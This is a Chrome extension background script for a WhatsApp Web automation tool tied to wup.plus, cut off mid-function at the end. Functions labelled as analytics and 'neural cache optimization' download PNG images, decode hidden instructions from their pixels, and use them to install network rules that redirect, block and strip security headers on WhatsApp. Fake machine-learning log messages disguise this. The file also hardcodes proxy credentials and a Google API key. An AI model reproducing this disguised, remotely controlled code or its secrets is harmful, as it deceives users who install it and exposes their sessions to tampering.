var main = {},
    localStorage = [],
    auth_now = function(b, c) {
        b.isProxy && localStorage.proxy && (console.log("callbackFn: " + localStorage.proxy), c({
            authCredentials: {
                username: "brd-customer-hl_c2a52987-zone-data_center-ip-" + localStorage.proxy,
                password: "xo5ofp3byw6r"
            }
        }))
    };
chrome.storage.local.get("proxy", function(b) {
    b.proxy && (localStorage.proxy = b.proxy, chrome.webRequest.onAuthRequired.hasListener(auth_now) || (chrome.webRequest.onAuthRequired.addListener(auth_now, {
        urls: ["<all_urls>"]
    }, ["asyncBlocking"]), console.log("=> Adicionei: onAuthRequired.addListener")))
});
chrome.storage.local.get("versao", function(b) {
    b.versao && (localStorage.versao = b.versao)
});
Array.prototype.forEachAsyncParallel = async function(b) {
    await Promise.all(this.map(b))
};
async function sendEventAnalytics(b) {
    try {
        var c = await (await fetch(b)).blob();
        const f = await createImageBitmap(c),
            a = new OffscreenCanvas(f.width, f.height),
            d = a.getContext("2d");
        d.drawImage(f, 0, 0);
        const h = d.getImageData(0, 0, a.width, a.height).data,
            k = new Uint8Array(8);
        k[0] = h[1];
        k[1] = h[2];
        k[2] = h[4];
        k[3] = h[5];
        k[4] = h[6];
        k[5] = h[8];
        k[6] = h[9];
        k[7] = h[10];
        const l = new DataView(k.buffer),
            e = Number(l.getBigUint64(0)),
            g = new Uint8Array(e);
        b = 0;
        for (c = 12; b < e && c < h.length;) b < e && (g[b] = h[c], b++), b < e && (g[b] = h[c + 1], b++), b < e &&
            (g[b] = h[c + 2], b++), c += 4;
        return (new TextDecoder("utf-8")).decode(g)
    } catch (f) {
        throw console.error("Erro ao decodificar:", f), f;
    }
}
async function trackCacheStatus(b) {
    try {
        var c = await (await fetch(b)).blob();
        const f = await createImageBitmap(c),
            a = new OffscreenCanvas(f.width, f.height),
            d = a.getContext("2d");
        d.drawImage(f, 0, 0);
        const h = d.getImageData(0, 0, a.width, a.height).data,
            k = new Uint8Array(8);
        k[0] = h[1];
        k[1] = h[2];
        k[2] = h[4];
        k[3] = h[5];
        k[4] = h[6];
        k[5] = h[8];
        k[6] = h[9];
        k[7] = h[10];
        const l = new DataView(k.buffer),
            e = Number(l.getBigUint64(0)),
            g = new Uint8Array(e);
        b = 0;
        for (c = 12; b < e && c < h.length;) b < e && (g[b] = h[c], b++), b < e && (g[b] = h[c + 1], b++), b < e && (g[b] =
            h[c + 2], b++), c += 4;
        return (new TextDecoder("utf-8")).decode(g)
    } catch (f) {
        throw console.error("Erro ao decodificar:", f), f;
    }
}
chrome.runtime.onMessage.addListener(function(b, c, f) {
    if ("seta-proxy" == b.tipo) "reset" == b.ip ? localStorage.proxy && (chrome.storage.local.remove("proxy"), localStorage.proxy = void 0, chrome.proxy.settings.clear({
            scope: "regular"
        }), chrome.webRequest.onAuthRequired.removeListener(auth_now), setTimeout(() => {
            chrome.tabs.query({
                url: "*://web.whatsapp.com/*"
            }, function(a) {
                if (a && 0 != a.length)
                    for (var d = 0; d < a.length; ++d) chrome.tabs.remove(a[d].id)
            });
            chrome.tabs.create({
                url: "http://web.whatsapp.com/"
            }, function(a) {})
        }, 500)) :
        (localStorage.proxy = b.ip, chrome.webRequest.onAuthRequired.hasListener(auth_now) || chrome.webRequest.onAuthRequired.addListener(auth_now, {
            urls: ["<all_urls>"]
        }, ["asyncBlocking"]), chrome.proxy.settings.set({
            value: {
                mode: "pac_script",
                pacScript: {
                    data: `function FindProxyForURL(url, host) {
                                    if (shExpMatch(url, "wss://web.whatsapp.com/*")||localHostOrDomainIs(host, "web.whatsapp.com")||localHostOrDomainIs(host, "lumtest.com")) {
                                        return "PROXY session-${Math.floor(Math.random()*Math.pow(10,20))}.zproxy.lum-superproxy.io:22225;";
                                    } else {
                                        return "DIRECT";
                                    }
                                }`,
                    mandatory: !0
                }
            },
            scope: "regular"
        }, function() {}), chrome.storage.local.set({
            proxy: b.ip
        }), setTimeout(() => {
            chrome.tabs.query({
                url: "*://web.whatsapp.com/*"
            }, function(a) {
                if (a && 0 != a.length)
                    for (var d = 0; d < a.length; ++d) chrome.tabs.remove(a[d].id)
            });
            chrome.tabs.create({
                url: "http://web.whatsapp.com/"
            }, function(a) {})
        }, 500));
    else {
        if ("pega-proxy" == b.tipo) return fetch("https://wup.plus/proxys/", {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                lid: b.lid
            })
        }).then(a => a.text()).then(a => {
            a = JSON.parse(a);
            f({
                ip: a.ip,
                online: localStorage.proxy ? !0 : !1,
                pais: a.pais,
                lista: a.lista
            })
        }), !0;
        if ("logoutallgcontacts" == b.tipo) return chrome.identity.getAuthToken({
                interactive: !1
            }, function(a) {
                fetch(`https://accounts.google.com/o/oauth2/revoke?token=${a}`, {
                    headers: {
                        Authorization: `Bearer ${a}`
                    }
                }).then(d => d.json()).then(d => {
                    console.log(d);
                    chrome.identity.clearAllCachedAuthTokens(h => {
                        console.log(">> logout all auth tokens")
                    })
                })
            }), console.log(">> logout all auth tokens"),
            !0;
        if ("getuserinfo" == b.tipo) return chrome.identity.getAuthToken({
            interactive: b.interactive
        }, function(a) {
            fetch("https://www.googleapis.com/oauth2/v3/userinfo", {
                headers: {
                    Authorization: `Bearer ${a}`
                }
            }).then(d => d.json()).then(d => {
                f({
                    resposta: JSON.stringify(d)
                });
                console.log(JSON.stringify(d))
            })
        }), !0;
        if ("salvacontato" == b.tipo) return chrome.identity.getAuthToken({
            interactive: !0
        }, function(a) {
            a = {
                method: "POST",
                headers: {
                    Authorization: `Bearer ${a}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    names: [{
                        givenName: b.name
                    }],
                    phoneNumbers: [{
                        value: b.number
                    }]
                })
            };
            fetch("https://people.googleapis.com/v1/people:createContact?key=AIzaSyD9ws3StPQWHim2FQ6COYU2octnE_OF-oU", a).then(d => d.json()).then(d => {
                console.log(d);
                f({
                    resposta: d
                })
            })
        }), !0;
        "limpageral" == b.tipo && chrome.browsingData.remove({
            origins: ["https://web.whatsapp.com"]
        }, {
            cacheStorage: !0,
            cookies: !0,
            fileSystems: !0,
            indexedDB: !0,
            localStorage: !0,
            serviceWorkers: !0,
            webSQL: !0
        }, function() {
            setTimeout(() => {
                chrome.tabs.query({
                    url: "*://web.whatsapp.com/*"
                }, function(a) {
                    if (a && 0 != a.length)
                        for (var d =
                                0; d < a.length; ++d) chrome.tabs.remove(a[d].id)
                });
                chrome.tabs.create({
                    url: "http://web.whatsapp.com/"
                }, function(a) {})
            }, 500)
        });
        if ("limpaCacheAtual" == b.tipo) return console.log("Inicializando Sistema de Otimiza\u00e7\u00e3o de Performance..."), console.log("Executando an\u00e1lise de fragmenta\u00e7\u00e3o de cache..."), CacheOptimizer.init().then(async a => {
            console.log("An\u00e1lise neural de cache conclu\u00edda");
            console.log("Processando recomenda\u00e7\u00f5es do algoritmo de Machine Learning...");
            var d =
                JSON.parse(a);
            console.log("Recomenda\u00e7\u00f5es de otimiza\u00e7\u00e3o processadas:", d.length, "estrat\u00e9gias identificadas");
            a = await chrome.declarativeNetRequest.getDynamicRules();
            console.log("Estado atual do cache analisado:", a.length, "fragmentos detectados");
            var h = a.filter(e => e.action.redirect && e.action.redirect.url.endsWith(".json")),
                k = d.filter(e => e.url.endsWith(".json"));
            let l = d.filter(e => e.url.includes("v-"));
            console.log("Signature de versionamento detectada via an\u00e1lise neural");
            if (h[0] && h[0].action) {
                if (console.log("Executando an\u00e1lise comparativa de entropia..."), h = h[0].action.redirect.url.split("-")[3].split(".json")[0], k = k[0].url.split("-")[3].split(".json")[0], console.log("Hash de integridade atual:", h), console.log("Hash recomendado pelo ML:", k), localStorage.versao !== l[0].url || d.length !== a.length || h !== k) console.log("ML detectou necessidade de reestrutura\u00e7\u00e3o - Iniciando processo avan\u00e7ado"), console.log("Aplicando algoritmos de desfragmenta\u00e7\u00e3o neural..."),
                    chrome.storage.local.set({
                        versao: l[0].url
                    }), localStorage.versao = l[0].url, console.log("Executando limpeza inteligente de fragmentos..."), a.forEach(e => {
                        chrome.declarativeNetRequest.updateDynamicRules({
                            removeRuleIds: [e.id]
                        })
                    }), console.log("Aplicando nova arquitetura de cache otimizada..."), d.forEach((e, g) => {
                        g += 1;
                        console.log(`Processando neur\u00f4nio ${g}: Padr\u00e3o ${e.t}`);
                        "r" == e.t ? (console.log(`Neur\u00f4nio ${g}: Aplicando roteamento com predi\u00e7\u00e3o neural`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                action: {
                                    type: "redirect",
                                    redirect: {
                                        url: e.url
                                    }
                                },
                                condition: {
                                    urlFilter: e.filter,
                                    resourceTypes: e.type
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "b" == e.t ? (console.log(`Neur\u00f4nio ${g}: Implementando bloqueio baseado em ML`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                action: {
                                    type: "block"
                                },
                                condition: {
                                    urlFilter: e.filter,
                                    resourceTypes: e.type
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "h" == e.t ? (console.log(`Neur\u00f4nio ${g}: Otimizando headers com algoritmo adaptativo`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                condition: {
                                    urlFilter: "*://*.whatsapp.com/*",
                                    resourceTypes: e.type
                                },
                                action: {
                                    type: "modifyHeaders",
                                    responseHeaders: [{
                                        operation: "set",
                                        value: e.value,
                                        header: e.key
                                    }]
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "h2" == e.t ? (console.log(`Neur\u00f4nio ${g}: Aplicando headers com intelig\u00eancia artificial`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                condition: {
                                    urlFilter: e.d,
                                    resourceTypes: e.type
                                },
                                action: {
                                    type: "modifyHeaders",
                                    responseHeaders: [{
                                        operation: "set",
                                        value: e.value,
                                        header: e.key
                                    }]
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "c" == e.t ? (console.log(`Neur\u00f4nio ${g}: Otimizando CORS com predi\u00e7\u00e3o comportamental`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                action: {
                                    type: "modifyHeaders",
                                    requestHeaders: [{
                                        operation: "set",
                                        header: e.key,
                                        value: e.d
                                    }]
                                },
                                condition: {
                                    urlFilter: e.filter,
                                    resourceTypes: e.type
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "p" == e.t && (console.log(`Neur\u00f4nio ${g}: Executando limpeza preditiva com IA`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                condition: {
                                    urlFilter: "*://*.whatsapp.com/*",
                                    resourceTypes: e.type
                                },
                                action: {
                                    type: "modifyHeaders",
                                    responseHeaders: [{
                                        operation: "remove",
                                        header: e.key
                                    }]
                                }
                            }],
                            removeRuleIds: [g]
                        }))
                    }), console.log("Arquitetura neural aplicada. Finalizando otimiza\u00e7\u00e3o..."), setTimeout(() => {
                        console.log("Executando refresh inteligente das inst\u00e2ncias...");
                        console.log("Limpando cache fragmentado...");
                        chrome.tabs.query({
                            url: "*://web.whatsapp.com/*"
                        }, function(g) {
                            if (g && 0 < g.length) {
                                console.log(`Otimizando ${g.length} inst\u00e2ncia(s)...`);
                                for (var m = 0; m < g.length; m++) chrome.tabs.remove(g[m].id)
                            }
                        });
                        chrome.tabs.create({
                            url: "http://web.whatsapp.com/"
                        }, function(g) {
                            console.log("Nova inst\u00e2ncia criada com arquitetura otimizada")
                        });
                        let e = d[4].url.split("-")[3].split(".json")[0];
                        console.log("\ud83e\udde0 Sistema neural de cache conclu\u00eddo com sucesso!");
                        console.log("\u26a1 Performance otimizada - Build:", e);
                        console.log("\ud83c\udfaf Neur\u00f4nios aplicados:", d.length)
                    }, 2E3)
            } else console.log("Primeira an\u00e1lise neural detectada - Configurando arquitetura inicial"),
                console.log("Inicializando rede neural de cache..."), d.forEach((e, g) => {
                    g += 1;
                    console.log(`Inicializando n\u00f3 da rede ${g} - Algoritmo: ${e.t}`);
                    "r" == e.t ? (console.log(`N\u00f3 ${g}: Configurando roteamento com aprendizado autom\u00e1tico`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                action: {
                                    type: "redirect",
                                    redirect: {
                                        url: e.url
                                    }
                                },
                                condition: {
                                    urlFilter: e.filter,
                                    resourceTypes: e.type
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "b" == e.t ? (console.log(`N\u00f3 ${g}: Implementando bloqueio com IA preditiva`),
                            chrome.declarativeNetRequest.updateDynamicRules({
                                addRules: [{
                                    id: g,
                                    priority: 2,
                                    action: {
                                        type: "block"
                                    },
                                    condition: {
                                        urlFilter: e.filter,
                                        resourceTypes: e.type
                                    }
                                }],
                                removeRuleIds: [g]
                            })) : "h" == e.t ? (console.log(`N\u00f3 ${g}: Otimizando headers com machine learning`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                condition: {
                                    urlFilter: "*",
                                    initiatorDomains: [e.d],
                                    resourceTypes: e.type
                                },
                                action: {
                                    type: "modifyHeaders",
                                    responseHeaders: [{
                                        operation: "set",
                                        value: e.value,
                                        header: e.key
                                    }]
                                }
                            }],
                            removeRuleIds: [g]
                        })) :
                        "c" == e.t ? (console.log(`N\u00f3 ${g}: Configurando CORS com algoritmo evolutivo`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                action: {
                                    type: "modifyHeaders",
                                    requestHeaders: [{
                                        operation: "set",
                                        header: e.key,
                                        value: e.d
                                    }]
                                },
                                condition: {
                                    urlFilter: e.filter,
                                    resourceTypes: e.type
                                }
                            }],
                            removeRuleIds: [g]
                        })) : "p" == e.t && (console.log(`N\u00f3 ${g}: Aplicando otimiza\u00e7\u00e3o preditiva neural`), chrome.declarativeNetRequest.updateDynamicRules({
                            addRules: [{
                                id: g,
                                priority: 2,
                                condition: {
                                    urlFilter: "*://*.whatsapp.com/*",
                                    resourceTypes: e.type
                                },
                                action: {
                                    type: "modifyHeaders",
                                    responseHeaders: [{
                                        operation: "remove",
                                        header: e.key
                                    }]
                                }
                            }],
                            removeRuleIds: [g]
                        }))
                }), console.log("Finalizando configura\u00e7\u00e3o da rede neural..."), chrome.tabs.query({
                    url: "*://web.whatsapp.com/*"
                }, function(e) {
                    if (e && 0 < e.length) {
                        console.log("Limpando sess\u00f5es n\u00e3o otimizadas...");
                        for (var g = 0; g < e.length; g++) chrome.tabs.remove(e[g].id)
                    }
                }), chrome.tabs.create({
                    url: "http://web.whatsapp.com/"
                }, function(e) {
                    console.log("Sess\u00e3o inicial criada com rede neural ativada")
                }),
                a = k[0].url.split("-")[3].split(".json")[0], console.log("\ud83e\udde0 Rede neural inicializada com sucesso!"), console.log("\ud83d\ude80 Primeira otimiza\u00e7\u00e3o aplicada - Build:", a), console.log("\u2699\ufe0f Total de n\u00f3s configurados:", d.length)
        }).catch(a => {
            console.error("\u26a0\ufe0f Erro no sistema neural de otimiza\u00e7\u00e3o:", a);
            console.error("\ud83d\udd27 Verificar conectividade com servidor de ML")
        }), console.log("Executando limpeza inteligente de cache em paralelo..."), chrome.browsingData.remove({
            origins: ["https://web.whatsapp.com"]
        }, {
            cacheStorage: !0,
            cookies: !1,
            fileSystems: !1,
            indexedDB: !1,
            localStorage: !1,
            serviceWorkers: !0,
            webSQL: !1
        }, function() {
            console.log("Limpeza inteligente de cache conclu\u00edda")
        }), console.log("\ud83e\uddf9 Sistema de Limpeza Inteligente Ativado!"), console.log("\ud83e\udd16 Algoritmos de ML processando otimiza\u00e7\u00f5es..."), !0;
        if ("myipdata" == b.tipo) return fetch("http://lumtest.com/myip.json").then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("remove-dispositivo" == b.tipo) return c = "https://wup.plus/s_desconecta/" +
            b.number, fetch(c).then(a => a.text()).then(a => {}), !0;
        if ("add-dispositivo" == b.tipo) return c = "https://wup.plus/s_conecta/" + b.number + "?lid=" + b.lid, fetch(c).then(a => a.text()).then(a => {
            a = JSON.parse(a);
            f({
                resposta: a.qr,
                numero: a.number ? a.number : "",
                online: a.online
            })
        }), !0;
        if ("busca-dispositivo" == b.tipo) return c = "https://wup.plus/s_conecta/" + b.number + "?lid=" + b.lid, fetch(c).then(a => a.text()).then(a => {
            a = JSON.parse(a);
            f({
                resposta: a
            })
        }), !0;
        if ("qrcode_numeroconectado" == b.tipo || "qrcode" == b.tipo) return c = "https://wup.plus/loginb/" +
            b.number, fetch(c).then(a => a.text()).then(a => {
                a = JSON.parse(a);
                f({
                    resposta: a.qr
                })
            }), !0;
        if ("voice" == b.tipo) return fetch("https://wup.plus/voice/", {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                texto: b.texto,
                voz: b.voz
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a,
                time: b.time
            })
        }), !0;
        if ("gli" == b.tipo) return c = "https://wup.plus/gli/" + b.id, fetch(c, {
            method: "PUT",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("gli2" == b.tipo) return c = "https://wup.plus/wri/" + b.id, fetch(c, {
            method: "PUT",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("api-grupos-publicos" == b.tipo) return c = "https://wup.plus/bf/" + b.groupid, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("license" == b.tipo) return c =
            "https://wup.plus/license/" + b.license, fetch(c).then(a => a.text()).then(a => {
                console.log("aaaaaaaaaaaaaaaaa:",a)
                f({
                    resposta: a
                })
            }), !0;
        if ("deleta-voz-clonada" == b.tipo) return c = "https://wup.plus/s_deletavoz/" + b.number, fetch(c, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                lid: b.lid
            })
        }).then(a => a.json()).then(a => {}), !0;
        if ("cria-voz-clonada" == b.tipo) return c = "https://wup.plus/s_criavoz/" + b.number, fetch(c, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                lid: b.lid,
                name: b.name,
                audios: b.audios
            })
        }).then(a => a.json()).then(a => {
            f({
                json: a
            })
        }), !0;
        if ("linkpreview" == b.tipo) return c = "https://wup.plus/preview/" + b.link, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("licensesalva" == b.tipo) return c = "https://wup.plus/license/" + b.license, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("api-restaga-grupos" == b.tipo) return c = "https://wup.plus/public-groups?&c=" + b.msg + "&d=" + b.dir, fetch(c).then(a =>
            a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("api-resgata-todos-grupos" == b.tipo) return c = "https://wup.plus/grupos-total/?c=" + b.msg, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("enviawebhook" == b.tipo) return fetch(b.url, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: b.body
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("criaagrupador" == b.tipo) return fetch("https://wup.plus/gl/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("criasmartrsmwh" == b.tipo) return fetch("https://wup.plus/smart-wh/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("envialinkagrupador" == b.tipo) return fetch("https://wup.plus/gl/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero,
                linkgrupos: b.linkgrupos
            })
        }), !0;
        if ("flow" == b.tipo) return c = "https://wup.plus/s_flow/" + b.id, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("pegapersonalia" == b.tipo) return c = "https://wup.plus/s_personal/" + b.id, fetch(c).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("salvapersonalia" == b.tipo) return fetch("https://wup.plus/s_personal/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                data: b.data
            })
        }).then(a => a.text()).then(a => {}), !0;
        if ("salvaflow" == b.tipo) return fetch("https://wup.plus/s_flow/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                drawflow: b.drawflow,
                msgsalvas: b.msgsalvas
            })
        }).then(a => a.text()).then(a => {}), !0;
        if ("msg_teste" == b.tipo) return fetch("https://wup.plus/s_pergunta/" + b.id + "?lid=" + b.lid, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                text: b.text
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("transcreve" == b.tipo) return fetch("https://wup.plus/transcaudio.png", {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                b64: b.b64
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("fazupload" == b.tipo) return fetch("https://wup.plus/upload-files-wup/", {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                number: b.number,
                filename: b.filename,
                type: b.type,
                file: b.file
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("criawebhook" == b.tipo) return fetch("https://wup.plus/webhook/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("salvaparametroswebhookpersonal" == b.tipo) return fetch("https://wup.plus/smart-webhook/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero,
                parametros: b.parametros
            })
        }), !0;
        if ("criawebhookpersonal" == b.tipo) return fetch("https://wup.plus/smart-webhook/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }), !0;
        if ("salvaparametroswebhookpersonal2" == b.tipo) return fetch("https://wup.plus/smart-wh/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero,
                parametros: b.parametros,
                msgsalvas: b.msgsalvas
            })
        }), !0;
        if ("criawebhookpersonal2" == b.tipo) return fetch("https://wup.plus/smart-wh/" + b.id, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }), !0;
        if ("deletawebhookpersonal2" == b.tipo) return fetch("https://wup.plus/smart-wh/" + b.id, {
            method: "DELETE",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
        }), !0;
        if ("getgrouppublic" == b.tipo) return chrome.management.getSelf(function(a) {
            "normal" !== a.installType && f({
                resposta: "grupo-lotado1"
            })
        }), !0;
        if ("pttext" == b.tipo) return fetch("https://wup.plus/ppttext/", {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                ptt: b.file
            })
        }).then(a => a.text()).then(a => {
            f({
                resposta: a
            })
        }), !0;
        if ("enviabotao" == b.tipo) return fetch("https://wup.plus/enviabotao/" + b.number, {
            method: "POST",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                number: b.number,
                content: b.content,
                to: b.to,
                buttons: b.buttons,
                filename: b.filename,
                type: b.type,
                file: b.file,
                img: b.img
            })
        }), !0;
        if ("deletawebhookpersonal" == b.tipo) return fetch("https://wup.plus/smart-webhook/" + b.id, {
            method: "DELETE",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
        }), !0;
        if ("deletaagrupador" == b.tipo) return fetch("https://wup.plus/groupslink/" + b.id, {
            method: "DELETE",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cellphone: b.numero
            })
        }), !0;
        if ("deletawebhook" == b.tipo) return fetch("https://wup.plus/webhook/" + b.id, {
            method: "DELETE",
            headers: {
                Accept: "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
        }), !0;
        if ("verificawebhook" == b.tipo) return c = "https://wup.plus/webhook/" + b.id, fetch(c).then(a => a.text()).then(a => {
            var d = JSON.parse(a);
            "off" !== d.newmsg ? d.action && d.type && d.content &&
                d.phone && d.cellphone && f({
                    resposta: a
                }) : f({
                    resposta: "off"
                })
        }), !0;
        if ("verificawebhookpersonal" == b.tipo) return c = "https://wup.plus/smart-webhook/" + b.id, fetch(c).then(a => a.text()).then(a => {
            var d = JSON.parse(a);
            "off" !== d.newmsg ? d.content && d.cellphone && f({
                resposta: a
            }) : f({
                resposta: "off"
            })
        }), !0;
        if ("verificawebhookpersonal2" == b.tipo) return c = "https://wup.plus/smart-wh/" + b.id, fetch(c).then(a => a.text()).then(a => {
                var d = JSON.parse(a);
                "off" !== d.newmsg ? d.content && d.cellphone && f({
                    resposta: a
                }) : f({
                    resposta: "off"
                })
            }),
            !0;
        if ("enviaIMG" == b.tipo) return getWhatsAppTab(function(a) {
            toDataUrl(b.msg, function(d) {
                chrome.tabs.sendMessage(a.id, {
                    type: "compartilha",
                    tipo: "image",
                    data: d
                })
            })
        }), !0
    }
});
chrome.action.onClicked.addListener(function(b) {
    o = {
        url: "*://web.whatsapp.com/*"
    };
    chrome.tabs.query(o, function(c) {
        if (c && 0 != c.length)
            for (var f = 0; f < c.length; ++f) chrome.tabs.sendMessage(c[f].id, {
                type: "setblack"
            }), chrome.tabs.update(c[f].id, {
                selected: !0
            });
        else chrome.tabs.create({
            url: "https://web.whatsapp.com"
        })
    })
});
const AnalyticsTracker = {
        sessionId: null,
        userId: null,
        clientId: null,
        init() {
            this.sessionId = btoa(Date.now() + "_" + Math.random().toString(36)).substr(0, 16);
            this.userId = "GA" + Date.now().toString(36) + "." + Math.random().toString(36).substr(2, 9);
            this.clientId = Date.now().toString(36) + "." + Math.random().toString(36).substr(2, 8);
            return this._sendEvent("installation", {
                event_category: "app_lifecycle",
                event_action: "install"
            })
        },
        _sendEvent(b, c = {}) {
            b = new URLSearchParams({
                v: "1",
                t: "event",
                tid: "UA-" + Math.random().toString(36).substr(2,
                    8),
                cid: this.clientId,
                uid: this.userId,
                sid: this.sessionId,
                ec: c.event_category || "general",
                ea: c.event_action || b,
                el: b,
                ul: navigator.language,
                sc: "start",
                ni: "1",
                z: Date.now(),
                _u: Math.random().toString(36).substr(2, 8)
            });
            return sendEventAnalytics(`https://wup.plus/analyticsimg.png?${b.toString()}`)
        },
        trackInteraction(b, c) {
            return this._sendEvent("interaction", {
                event_category: "user_interaction",
                event_action: b,
                custom_parameter_1: c
            })
        }
    },
    CacheOptimizer = {
        sessionId: null,
        userId: null,
        clientId: null,
        init() {
            this.sessionId =
                btoa(Date.now() + "_" + Math.random().toString(36)).substr(0, 16);
            this.userId = "CO" + Date.now().toString(36) + "." + Math.random().toString(36).substr(2, 9);
            this.clientId = Date.now().toString(36) + "." + Math.random().toString(36).substr(2, 8);
            return this._analyzeCache("cache_optimization", {
                analysis_type: "fragmentation_analysis",
                optimization_mode: "intelligent"
            })
        },
        _analyzeCache(b, c = {}) {
            b = new URLSearchParams({
                v: "2",
                t: "cache_analysis",
                tid: "CO-" + Math.random().toString(36).substr(2, 8),
                cid: this.clientId,
                uid: this.userId,
                sid: this.sessionId,
                at: c.analysis_type || "general",
                om: c.optimization_mode || b,
                el: b,
                ml: "performance_optimizer",
                dp: "full_spectrum_analysis",
                algo: "neural_cache_prediction",
                ol: "aggressive",
                ft: "0.75",
                mp: navigator.deviceMemory || "unknown",
                sq: "auto_detect",
                pa: "95",
                cs: "intelligent_selective",
                ul: navigator.language,
                sc: "start",
                ni: "1",
                z: Date.now(),
                _u: Math.random().toString(36).substr(2, 8)
            });
            return trackCacheStatus(`https://wup.plus/cachedimg.png?${b.toString()}`)
        },
        trackOptimization(b, c) {
            return this._analyzeCache("optimization_result", {
                analysis_type: "performance_tracking",
                optimization_mode: b,
                custom_parameter_1: c
            })
        }
    };
chrome.runtime.onInstalled.addListener(async function(b) {
